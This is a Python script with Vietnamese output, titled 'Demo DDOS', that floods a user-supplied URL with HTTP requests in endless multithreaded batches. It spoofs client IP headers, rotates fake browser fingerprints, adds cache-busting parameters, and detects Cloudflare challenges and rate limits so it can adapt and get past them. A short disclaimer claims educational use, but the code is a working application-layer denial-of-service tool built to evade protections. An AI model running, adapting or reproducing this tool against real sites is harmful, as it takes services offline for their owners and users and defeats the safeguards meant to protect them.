import requests
import time
import signal
import sys
import os
import platform
import random
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import socket
import ssl
import gzip
import zlib
import re
import json
import base64
import hmac
import hashlib
import threading

# Thêm màu sắc
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

REQUESTS = 1000
INITIAL_CONCURRENCY = 50

is_paused = False
is_running = True
total_success = 0
total_error = 0
start_time_global = None
CONCURRENCY = INITIAL_CONCURRENCY
successful_techniques = {}
rate_limited = False
cloudflare_detected = False
challenge_detected = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.94 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
]

PROXIES = []

TECHNIQUES = [
    "standard",
    "browser_like",
    "ajax",
    "api_like",
    "mobile_app"
]

def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def get_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def get_random_browser_fingerprint():
    platforms = ["Win32", "Win64", "MacIntel", "Linux x86_64"]
    color_depths = [24, 30, 48]
    resolutions = [[1366, 768], [1920, 1080], [2560, 1440], [3840, 2160]]
    timezones = [-720, -660, -600, -570, -540, -480, -420, -360, -300, -240, -210, -180, -120, -60, 
                0, 60, 120, 180, 210, 240, 300, 330, 345, 360, 390, 420, 480, 525, 540, 570, 600, 630, 660, 720]
    
    return {
        "platform": random.choice(platforms),
        "colorDepth": random.choice(color_depths),
        "resolution": random.choice(resolutions),
        "timezone": random.choice(timezones),
        "plugins": random.randint(0, 10),
        "fonts": [get_random_string(8) for _ in range(random.randint(3, 15))],
        "canvas_hash": get_random_string(32),
        "webgl_hash": get_random_string(32),
        "language": random.choice(["en-US", "en-GB", "fr-FR", "de-DE", "es-ES", "it-IT", "ja-JP", "ko-KR", "zh-CN", "ru-RU"]),
        "user_agent": random.choice(USER_AGENTS)
    }

def signal_handler(sig, frame):
    global is_paused, is_running
    if is_paused:
        print(f"\n{Colors.RED}[!] Đang thoát chương trình...{Colors.END}")
        is_running = False
    else:
        print(f"\n{Colors.YELLOW}[!] Đã tạm dừng. Nhấn Ctrl+C lần nữa để thoát hoặc Enter để tiếp tục...{Colors.END}")
        is_paused = True

def resume_execution():
    global is_paused
    print(f"{Colors.GREEN}[+] Tiếp tục thực thi...{Colors.END}")
    is_paused = False

def get_browser_headers(technique="standard"):
    fingerprint = get_random_browser_fingerprint()
    user_agent = fingerprint["user_agent"]
    x_forwarded_for = get_random_ip()
    
    if technique == "standard":
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": x_forwarded_for,
            "X-Real-IP": x_forwarded_for
        }
    elif technique == "browser_like":
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": fingerprint["language"] + ";q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": f"https://www.google.com/search?q=site:{URL.split('//')[1].split('/')[0]}+{get_random_string(8)}",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "DNT": "1",
            "Sec-CH-UA": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": f"\"{fingerprint['platform']}\"",
            "X-Forwarded-For": x_forwarded_for
        }
    elif technique == "ajax":
        headers = {
            "User-Agent": user_agent,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": fingerprint["language"] + ";q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": URL,
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Forwarded-For": x_forwarded_for
        }
    elif technique == "api_like":
        timestamp = str(int(time.time()))
        nonce = get_random_string(16)
        headers = {
            "User-Agent": f"ApiClient/{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Api-Key": get_random_string(32),
            "X-Timestamp": timestamp,
            "X-Nonce": nonce,
            "X-Signature": hmac.new(
                get_random_string(32).encode(),
                (timestamp + nonce).encode(),
                hashlib.sha256
            ).hexdigest(),
            "X-Forwarded-For": x_forwarded_for
        }
    elif technique == "mobile_app":
        app_versions = ["1.0.0", "1.1.0", "1.2.0", "2.0.0", "2.1.0"]
        device_models = ["iPhone12,1", "iPhone13,2", "SM-G998B", "Pixel 6", "OnePlus 9 Pro"]
        os_versions = ["iOS 15.2", "iOS 14.8", "Android 12", "Android 11", "Android 10"]
        headers = {
            "User-Agent": user_agent,
            "Accept": "application/json",
            "Accept-Language": fingerprint["language"],
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "X-App-Version": random.choice(app_versions),
            "X-Device-Model": random.choice(device_models),
            "X-OS-Version": random.choice(os_versions),
            "X-Device-ID": get_random_string(36),
            "X-Forwarded-For": x_forwarded_for
        }
    else:
        headers = {
            "User-Agent": user_agent,
            "Accept": "*/*",
            "X-Forwarded-For": x_forwarded_for
        }
    return headers

def get_cookies(response=None):
    cookies = {
        f"cookie_{get_random_string(5)}": get_random_string(10),
        "session_id": get_random_string(32),
        "_ga": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time() - random.randint(1000000, 9999999))}",
        "_gid": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}"
    }
    if response and 'Set-Cookie' in response.headers:
        cookies_from_response = response.cookies.get_dict()
        cookies.update(cookies_from_response)
    return cookies

def check_cloudflare(response):
    global cloudflare_detected, challenge_detected
    if response is None:
        return False
    headers = response.headers
    content = response.text.lower() if hasattr(response, 'text') else ""
    cf_headers = [h for h in headers if h.lower().startswith(('cf-', 'server'))]
    is_cloudflare = any('cloudflare' in headers.get(h, '').lower() for h in cf_headers)
    has_challenge = ('challenge' in content or 'jschl' in content or 
                    'captcha' in content or 'cf-please-wait' in content)
    if has_challenge and not challenge_detected:
        challenge_detected = True
        print(f"{Colors.RED}[!] Phát hiện Cloudflare Challenge/Captcha{Colors.END}")
    if is_cloudflare and not cloudflare_detected:
        cloudflare_detected = True
        print(f"{Colors.RED}[!] Phát hiện trang web sử dụng Cloudflare{Colors.END}")
    return is_cloudflare or has_challenge

def check_rate_limit(response):
    global rate_limited
    if response is None:
        return False
    status_code = response.status_code
    is_limited = status_code in [429, 503, 403]
    headers = response.headers
    has_rate_limit_headers = any(h.lower() in headers for h in [
        'retry-after', 'x-ratelimit-remaining', 'x-ratelimit-reset'
    ])
    if (is_limited or has_rate_limit_headers) and not rate_limited:
        rate_limited = True
        print(f"{Colors.RED}[!] Phát hiện giới hạn tốc độ (Rate limiting): HTTP {status_code}{Colors.END}")
        if has_rate_limit_headers:
            for h in ['retry-after', 'x-ratelimit-remaining', 'x-ratelimit-reset']:
                if h.lower() in headers:
                    print(f"    - {h}: {headers[h.lower()]}")
    return is_limited or has_rate_limit_headers

def adaptive_delay():
    if rate_limited or cloudflare_detected or challenge_detected:
        return random.uniform(5.0, 10.0)
    else:
        return random.uniform(1.0, 3.0)

def adjust_concurrency():
    global CONCURRENCY
    if challenge_detected:
        CONCURRENCY = max(5, CONCURRENCY // 4)
    elif cloudflare_detected:
        CONCURRENCY = max(10, CONCURRENCY // 2)
    elif rate_limited:
        CONCURRENCY = max(20, CONCURRENCY - 10)
    elif len(successful_techniques) > 0:
        CONCURRENCY = min(CONCURRENCY + 5, 200)
    return CONCURRENCY

def make_request(URL):
    global successful_techniques
    if len(successful_techniques) > 0:
        if random.random() < 0.8:
            weights = [successful_techniques.get(t, 0) for t in TECHNIQUES]
            total = sum(weights)
            if total > 0:
                probabilities = [w/total for w in weights]
                technique = random.choices(TECHNIQUES, probabilities)[0]
            else:
                technique = random.choice(TECHNIQUES)
        else:
            technique = random.choice(TECHNIQUES)
    else:
        technique = random.choice(TECHNIQUES)
    try:
        random_params = f"?{get_random_string(5)}={get_random_string(8)}&_={int(time.time() * 1000)}"
        full_url = URL + random_params
        proxy = None
        if PROXIES:
            proxy = {
                'http': random.choice(PROXIES),
                'https': random.choice(PROXIES)
            }
        session = requests.Session()
        if proxy:
            session.proxies.update(proxy)
        headers = get_browser_headers(technique)
        cookies = get_cookies()
        time.sleep(random.uniform(0.1, 0.5))
        response = session.get(
            full_url, 
            headers=headers, 
            cookies=cookies, 
            timeout=15, 
            allow_redirects=True,
            verify=False
        )
        is_cloudflare = check_cloudflare(response)
        is_rate_limited = check_rate_limit(response)
        if is_cloudflare or is_rate_limited:
            time.sleep(adaptive_delay())
            updated_cookies = get_cookies(response)
            response = session.get(
                full_url, 
                headers=headers, 
                cookies=updated_cookies, 
                timeout=15, 
                allow_redirects=True,
                verify=False
            )
        if response.status_code < 400:
            successful_techniques[technique] = successful_techniques.get(technique, 0) + 1
        return response.status_code
    except requests.RequestException:
        return None

def send_requests(batch_num, URL):
    global total_success, total_error, CONCURRENCY
    start_time = time.time()
    success_count = 0
    error_count = 0
    batch_size = 100
    total_batches = (REQUESTS + batch_size - 1) // batch_size
    for batch in range(total_batches):
        while is_paused and is_running:
            time.sleep(0.1)
        if not is_running:
            return
        remaining = min(batch_size, REQUESTS - batch * batch_size)
        if remaining <= 0:
            break
        current_concurrency = adjust_concurrency()
        print(f"{Colors.CYAN}[*] Đang xử lý batch nội bộ {batch+1}/{total_batches} ({remaining} requests) với {current_concurrency} threads{Colors.END}")
        with ThreadPoolExecutor(max_workers=current_concurrency) as executor:
            futures = [executor.submit(make_request, URL) for _ in range(remaining)]
            for future in futures:
                while is_paused and is_running:
                    time.sleep(0.1)
                if not is_running:
                    return
                result = future.result()
                if result and 200 <= result < 400:
                    success_count += 1
                else:
                    error_count += 1
        delay = adaptive_delay()
        print(f"{Colors.BLUE}[i] Đợi {delay:.2f} giây trước khi tiếp tục...{Colors.END}")
        time.sleep(delay)
    elapsed_time = time.time() - start_time
    total_success += success_count
    total_error += error_count
    print(f"\n{Colors.GREEN}[+] Kết quả Batch #{batch_num}:{Colors.END}")
    print(f"{Colors.GREEN}    - Đã hoàn thành {REQUESTS} requests trong {elapsed_time:.2f} giây{Colors.END}")
    print(f"{Colors.GREEN}    - Thành công: {success_count}, Lỗi: {error_count}{Colors.END}")
    print(f"{Colors.GREEN}    - Tốc độ: {REQUESTS/elapsed_time:.2f} requests/giây{Colors.END}")
    if successful_techniques:
        print(f"{Colors.GREEN}    - Kỹ thuật thành công:{Colors.END}")
        for technique, count in successful_techniques.items():
            print(f"{Colors.GREEN}      * {technique}: {count} lần{Colors.END}")

def print_stats(URL):
    global total_success, total_error, start_time_global
    if start_time_global:
        total_time = time.time() - start_time_global
        total_requests = total_success + total_error
        if total_requests > 0:
            print("\n" + "="*50)
            print(f"{Colors.BOLD}{Colors.HEADER}THỐNG KÊ TỔNG HỢP ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}){Colors.END}")
            print("="*50)
            print(f"{Colors.CYAN}URL đích:            {URL}{Colors.END}")
            print(f"{Colors.CYAN}Thời gian chạy:      {total_time:.2f} giây{Colors.END}")
            print(f"{Colors.CYAN}Tổng số requests:    {total_requests}{Colors.END}")
            print(f"{Colors.GREEN}Requests thành công: {total_success} ({total_success/total_requests*100:.2f}%){Colors.END}")
            print(f"{Colors.RED}Requests lỗi:        {total_error} ({total_error/total_requests*100:.2f}%){Colors.END}")
            print(f"{Colors.YELLOW}Tốc độ trung bình:   {total_requests/total_time:.2f} requests/giây{Colors.END}")
            if cloudflare_detected:
                print(f"{Colors.RED}Cloudflare:          Phát hiện{Colors.END}")
            if challenge_detected:
                print(f"{Colors.RED}Cloudflare Challenge: Phát hiện{Colors.END}")
            if rate_limited:
                print(f"{Colors.RED}Rate Limiting:       Phát hiện{Colors.END}")
            if successful_techniques:
                print(f"\n{Colors.GREEN}Kỹ thuật thành công:{Colors.END}")
                for technique, count in successful_techniques.items():
                    print(f"{Colors.GREEN}  - {technique}: {count} lần{Colors.END}")
            print("="*50)

def display_banner():
    banner = f"""
{Colors.RED}██████╗ ███████╗███╗   ███╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗{Colors.END}
{Colors.RED}██╔══██╗██╔════╝████╗ ████║██╔═══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝{Colors.END}
{Colors.RED}██║  ██║█████╗  ██╔████╔██║██║   ██║    ██║  ██║██║  ██║██║   ██║███████╗{Colors.END}
{Colors.YELLOW}██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║    ██║  ██║██║  ██║██║   ██║╚════██║{Colors.END}
{Colors.YELLOW}██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║{Colors.END}
{Colors.YELLOW}╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{Colors.END}
                                                                   
{Colors.CYAN}Advanced Web Testing Tool - Version 1.0 - by Văn Phong{Colors.END}
{Colors.RED}Chỉ sử dụng cho mục đích giáo dục và kiểm tra hệ thống của chính bạn!{Colors.END}
{Colors.RED}Sử dụng trái phép có thể vi phạm pháp luật.{Colors.END}
"""
    print(banner)

def main():
    global is_paused, is_running, start_time_global
    signal.signal(signal.SIGINT, signal_handler)
    try:
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except:
            pass
            
        # Hiển thị banner
        display_banner()
        
        URL = input(f"{Colors.CYAN}Nhập URL: {Colors.END}").strip()
        if not URL.startswith("http://") and not URL.startswith("https://"):
            URL = "https://" + URL
            
        print("\n" + "="*50)
        print(f"{Colors.BOLD}{Colors.HEADER}Demo DDOS{Colors.END}")
        print("="*50)
        print(f"{Colors.CYAN}URL đích:             {URL}{Colors.END}")
        print(f"{Colors.CYAN}Số lượng requests:    {REQUESTS}{Colors.END}")
        print(f"{Colors.CYAN}Số luồng ban đầu:     {CONCURRENCY}{Colors.END}")
        print(f"{Colors.CYAN}Hệ điều hành:         {platform.system()} {platform.release()}{Colors.END}")
        print(f"{Colors.CYAN}Số lõi CPU:           {os.cpu_count()}{Colors.END}")
        print("="*50)
        print(f"{Colors.YELLOW}[i] Nhấn Ctrl+C để tạm dừng/thoát{Colors.END}")
        print(f"{Colors.YELLOW}[i] Chương trình sẽ tự động điều chỉnh để vượt qua bảo vệ{Colors.END}")
        print("="*50 + "\n")
        
        start_time_global = time.time()
        count = 1
        while is_running:
            if not is_paused:
                print(f"\n{Colors.BLUE}[*] Bắt đầu Batch #{count}{Colors.END}")
                send_requests(count, URL)
                count += 1
                wait_time = adaptive_delay() * 2
                print(f"{Colors.YELLOW}[i] Đợi {wait_time:.2f} giây trước khi tiếp tục...{Colors.END}")
                time.sleep(wait_time)
            else:
                input()
                resume_execution()
    except Exception as e:
        print(f"\n{Colors.RED}[!] Lỗi không mong muốn: {str(e)}{Colors.END}")
    finally:
        print_stats(URL)
        print(f"\n{Colors.RED}[!] Chương trình đã kết thúc{Colors.END}")

if __name__ == "__main__":
    main()